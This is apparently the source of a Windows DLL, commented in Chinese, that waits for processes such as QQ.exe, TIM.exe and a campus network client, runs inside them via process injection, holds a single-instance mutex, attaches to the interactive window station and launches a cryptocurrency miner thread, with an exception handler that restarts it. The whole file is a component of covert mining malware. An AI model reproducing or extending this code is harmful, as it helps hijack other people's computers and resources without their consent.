// MinerDll.cpp: 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include "InjectProc.h"
#include "MinerDll.h"
#include "app.h"
#define NUM 5

extern HANDLE g_hThread;
extern HMODULE g_hDllModule; //定义Dll本身的句柄，方便自身函数回调

TCHAR procNameArray[NUM][16] = {
	L"IPClient.exe",
	L"ipclient.exe",
	L"出校器.exe",
	L"QQ.exe",
	L"TIM.exe"
};


TCHAR* waitClient()
{
	int i;

	for (i = 0; i < NUM; i++)		
	{
		Sleep(5000);
		if ((GetProcID(procNameArray[i])))
		{
			break;
		}
		i = 0;	
	}
	return procNameArray[i];
}


BOOL IsClient()
{
	for (int i = 0; i < NUM; i++)
	{
		if (GetCurrentProcessId() == GetProcID(procNameArray[i]))
			return TRUE;
	}
	return FALSE;
}

BOOL createMinerThread()
{
	DWORD threadID;

	CreateMutex(NULL, false, L"XmmR");
	//该互斥体是只允许一台PC拥有一个实例)	

	if (ERROR_ALREADY_EXISTS != GetLastError())
	{
		TCHAR PID[16];

		wsprintf(PID, L"%d", GetCurrentProcessId());
		MessageBox(GetDesktopWindow(), PID, L"Pid info", MB_OK);

		g_hThread = CreateThread(NULL, // default security attributes
			0, // use default stack size
			MyMain, // thread function
			NULL, // argument to thread function
			0, // use default creation flags	
			0); // returns the thread identifier

		if (g_hThread)
			return TRUE;
	}

	return FALSE;

}

//Dllmain 一定要开新线程 不能把它当做 main使用
DWORD WINAPI MyMain(LPVOID lpParam)
{

	HANDLE	hInstallMutex = NULL;
	HANDLE	hEvent = NULL;
	HANDLE hThread;

	TCHAR moudlePath[MAX_PATH];

	// Set Window Station
	//--这里是同窗口交互
	HWINSTA hOldStation = GetProcessWindowStation();    //功能获取一个句柄,调用进程的当前窗口
	HWINSTA hWinSta = OpenWindowStation(L"winsta0", FALSE, MAXIMUM_ALLOWED);   //　打开指定的窗口站  XP的默认窗口站

	if (hWinSta != NULL)
	{
		SetProcessWindowStation(hWinSta);   //设置本进程窗口为winsta0  // 分配一个窗口站给调用进程，以便该进程能够访问窗口站里的对象，如桌面、剪贴板和全局原子
		printf("[+] Set Station OK\n");
	}
	else
	{
		printf("[-] Set Station Failed\n");
	}

	//GetModuleFileName(NULL, moudlePath, MAX_PATH);	//取得当前文件的全路径
	//MessageBox(GetDesktopWindow(), moudlePath, L"info", MB_OK);


	if (g_hDllModule != NULL)   //g_hInstance 该值要在Dll的入口进行赋值
	{
		//自己设置了一个访问违规的错误处理函数 如果发生了错误 操作系统就会调用bad_exception
		//SetUnhandledExceptionFilter(bad_exception);  //这里就是错误处理的回调函数了

		//hInstallMutex = CreateMutex(NULL, false, L"start miner"); //该互斥体是只允许一台PC拥有一个实例)
		//ReleaseMutex(hInstallMutex);

		/*新建互斥体并且释放, 这样可以让前一 loader 退出*/


		App miner;
		return miner.exec();
	}

	return 0;
}




// 发生异常，重新创建进程
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{

	DWORD threadID;

	HANDLE hThread = CreateThread(NULL, // default security attributes
		0, // use default stack size
		MyMain, // thread function
		NULL, // argument to thread function
		0, // use default creation flags	
		&threadID); // returns the thread identifier

					//这里等待线程结束
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}